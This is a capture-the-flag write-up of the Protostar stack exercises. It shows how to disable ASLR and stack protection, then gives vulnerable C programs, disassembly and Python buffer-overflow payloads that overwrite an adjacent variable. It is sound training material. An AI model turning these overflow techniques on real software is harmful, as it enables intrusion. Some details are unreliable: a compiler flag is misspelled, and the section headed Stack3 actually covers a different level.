# Writeup Protostar2: Stack

Check ASLR:
```bash
sysctl -a --pattern "randomize"
```

Disable ASLR temporarily:

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```

Disable stack protection and make stack executable:
```bash
gcc -m32 -ggdb -fno-stack-protection -z execstack <source.c>
```

## Stack0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

`volatile` is a keyword in C indicating that this variable can change anytime  
by outside the code and is omitted from compiler optimization.

```
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
```

The integer `modified` is at `[esp+0x5c]` and is assigned to 0.  
Our buffer is right above it starting at `[esp+0x1c]`. We can easily verify the size:

```bash
(gdb) print 0x5c-0x1c
$1 = 64
```

A pointer to our buffer is 'pushed' onto the stack. After the call to `gets` the value of `modified` is checked against 0. The `gets` function has no boundery checks so we can write more than 64 bytes into the buffer and land in our modified variable. Every value besides 0 would evalute to true so writing 1 more byte into the buffer would set the least significant byte (because of the endianess) and would print the winning message.

```
(gdb) x/d $esp+0x5c
0xbffff69c:     2
(gdb) x/xw $esp+0x5c
0xbffff69c:     0x00000002
(gdb) x/5xb $esp+0x5b
0xbffff69b:     0x41    0x02    0x00    0x00    0x00

user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 64 + '\x02'" | ./stack0
you have changed the 'modified' variable
```

**Note:**

The print function appends a new line character `0xa` at the end.  
To avoid this we can use `sys.stdout.write()`:

```bash
user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 3" | hexdump -C
00000000  41 41 41 0a                                       |AAA.|
00000004
user@protostar:/opt/protostar/bin$ python -c "import sys; sys.stdout.write('\x41' * 3)" | hexdump -C
00000000  41 41 41                                          |AAA|
00000003
```

**Resources:**

https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/  
https://docs.python.org/2/library/sys.html#sys.stdout

## Stack1

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

This time we can specify user-defined input as an input parameter to `stack1`.  
The program uses the unsafe function `strcpy`. The man pages already warns us:

> The strings may not overlap, and the destination string dest must be large enough
> to receive the copy.  Beware of buffer overruns!  (See BUGS.)

This time we have to overwrite `modified` with `0x61626364`.  
The Intel x86 processors use the little-endian format where the least significant byte is stored at the lowest memory address. So `0x61626364` is actually saved as `0x64 0x63 0x62 0x61`. We can use the python's `struct` module to get the correct byte order and dump the bytes like this:

```python
#!/usr/bin/env python3

import struct

data = struct.pack('<I', 0x61626364)
data = ''.join('\\x{:02X}'.format(a) for a in data)
print(data)

# \x64\x63\x62\x61
```

Now we can simply craft another input string:

```
$ python -c "import sys; sys.stdout.buffer.write(b'\x41' * 64 + b'\x64\x63\x62\x61')" | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 6463 6261                                dcba
```

We can directly input it as an argument to gdb's `run` command:

```bash
(gdb) run $(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x64\x63\x62\x61')")
Starting program: /opt/protostar/bin/stack1 $(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x64\x63\x62\x61')")
you have correctly got the variable to the right value
```

## Stack3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

This time we can control the input via an environment variable. We can set an environment variable via `export`. We can use `printenv` to make sure that the variable is set correctly and that it is an environment variable and not a shell variable. Shell variables won't work here.

```bash
$ export GREENIE=$(python -c "import sys; sys.stdout.write(b'\x41' * 64 + b'\x0A\x0D\x0A\x0D')")
$ printenv GREENIE
$ ./stack3
$ you have correctly modified the variable
```
